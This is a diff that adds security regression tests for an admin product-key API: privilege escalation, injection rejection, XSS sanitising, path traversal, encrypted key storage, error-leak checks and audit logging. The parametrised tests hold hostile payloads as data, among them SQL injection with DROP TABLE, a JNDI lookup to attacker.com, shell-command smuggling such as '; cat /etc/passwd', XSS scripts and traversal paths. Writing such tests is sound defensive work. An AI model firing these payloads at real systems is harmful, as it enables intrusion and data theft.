@@ -14,6 +14,7 @@ from sqlalchemy.pool import StaticPool
 
 from app.api.admin_api import router as admin_router
 from app.auth import ProductKeyRegistry, get_auth_service, reset_auth_service
+from app.api.admin_api import _product_key_cipher
 from app.auth_db.models import AuditLog, Base, Company, PasswordHistory, ProductKey, User, UserDevice
 from app.auth_db.session import get_auth_db_session
 
@@ -405,3 +406,127 @@ def test_admin_endpoints_require_super_admin(admin_client):
 
     resp = client.get("/api/admin/users", headers=_auth_header(tokens["user"]))
     assert resp.status_code == 403
+
+
+def test_horizontal_privilege_escalation_denied_for_company_admin(admin_client):
+    client, _, tokens = admin_client
+
+    resp = client.post(
+        "/api/admin/product-keys",
+        json={"type": "enterprise_standard", "count": 1, "company_id": 2},
+        headers=_auth_header(tokens["company_admin"]),
+    )
+    assert resp.status_code == 403, resp.text
+
+
+@pytest.mark.parametrize(
+    "malicious_type",
+    [
+        "1' OR '1'='1",
+        "1; DROP TABLE product_keys--",
+        "1' UNION SELECT * FROM users--",
+        "${jndi:ldap://attacker.com/exploit}",
+        "1; cat /etc/passwd",
+        "1 | whoami",
+        "1 && ls -la",
+        "1`id`",
+    ],
+)
+def test_malicious_key_type_input_rejected(admin_client, malicious_type: str):
+    client, _, tokens = admin_client
+    resp = client.post(
+        "/api/admin/product-keys",
+        json={"type": malicious_type, "count": 1},
+        headers=_auth_header(tokens["super_admin"]),
+    )
+    assert resp.status_code == 422, resp.text
+
+
+def test_xss_payload_sanitized_in_metadata(admin_client):
+    client, _, tokens = admin_client
+
+    resp = client.post(
+        "/api/admin/product-keys",
+        json={
+            "type": "enterprise_standard",
+            "count": 1,
+            "company_id": 1,
+            "metadata": {"notes": "<script>alert('XSS')</script><img src=x onerror=alert(1)>"},
+        },
+        headers=_auth_header(tokens["company_admin"]),
+    )
+    assert resp.status_code == 200, resp.text
+
+    notes = resp.json()["data"]["keys"][0]["metadata"]["notes"]
+    assert "<script>" not in notes.lower()
+    assert "onerror" not in notes.lower()
+
+
+def test_path_traversal_payload_rejected(admin_client):
+    client, _, tokens = admin_client
+    payloads = [
+        "../../../etc/passwd",
+        "..\\..\\..\\windows\\system32",
+        "%2e%2e%2fetc%2fpasswd",
+        "....//....//....//etc/passwd",
+    ]
+    for payload in payloads:
+        resp = client.get(f"/api/admin/product-keys/{payload}", headers=_auth_header(tokens["super_admin"]))
+        assert resp.status_code in {404, 405, 422}, resp.text
+
+
+def test_key_storage_encryption_and_decryption(admin_client):
+    client, session_factory, tokens = admin_client
+
+    create_resp = client.post(
+        "/api/admin/product-keys",
+        json={"type": "enterprise_standard", "count": 1, "company_id": 1},
+        headers=_auth_header(tokens["company_admin"]),
+    )
+    assert create_resp.status_code == 200, create_resp.text
+    key_id = create_resp.json()["data"]["keys"][0]["id"]
+
+    with session_factory() as db:
+        db_key = db.query(ProductKey).filter(ProductKey.id == key_id).one()
+        assert db_key.product_key_ciphertext is not None
+        assert db_key.product_key_ciphertext != db_key.product_key
+        assert _product_key_cipher.decrypt(db_key.product_key_ciphertext) == db_key.product_key
+
+
+def test_api_error_information_leakage(admin_client):
+    client, _, tokens = admin_client
+    resp = client.post(
+        "/api/admin/product-keys",
+        json={"invalid": "data"},
+        headers=_auth_header(tokens["company_admin"]),
+    )
+    assert resp.status_code == 422, resp.text
+    body = resp.text.lower()
+    assert "traceback" not in body
+    assert "stack trace" not in body
+    assert "file path" not in body
+    assert "database" not in body
+    assert "sql" not in body
+
+
+def test_audit_log_integrity_for_key_creation(admin_client):
+    client, session_factory, tokens = admin_client
+    resp = client.post(
+        "/api/admin/product-keys",
+        json={"type": "enterprise_standard", "count": 1, "company_id": 1},
+        headers=_auth_header(tokens["company_admin"]),
+    )
+    assert resp.status_code == 200, resp.text
+
+    with session_factory() as db:
+        log = (
+            db.query(AuditLog)
+            .filter(AuditLog.operation_type == "create")
+            .order_by(AuditLog.id.desc())
+            .first()
+        )
+        assert log is not None
+        assert log.user_id == 4
+        assert log.target_table == "product_keys"
+        assert log.details["action"] == "create_product_keys"
+        assert log.operated_at is not None
